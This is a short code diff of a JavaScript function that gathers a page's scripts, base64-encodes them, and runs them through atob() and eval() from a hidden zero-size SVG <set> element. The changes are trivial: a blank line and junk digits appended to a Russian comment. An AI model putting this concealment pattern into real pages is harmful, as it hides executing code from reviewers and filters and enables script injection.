@@ -1,4 +1,5 @@
 function combineAndObfuscateScripts() {
+
     var scriptUrls = [];
     var scriptElements = document.getElementsByTagName('script');
     var combinedScript = '';
@@ -29,7 +30,7 @@ function combineAndObfuscateScripts() {
     svg.setAttribute("width", "0");
     svg.setAttribute("height", "0");
 
-    // Создаем элемент <set> для вызова скрипта
+    // Создаем элемент <set> для вызова скрипта 123123123123123123123
     var set = document.createElementNS("http://www.w3.org/2000/svg", "set");
     set.setAttribute("attributeName", "innerHTML");
     set.setAttribute("to", `var decodedScript = atob('${obfuscatedScript}'); eval(decodedScript);`);
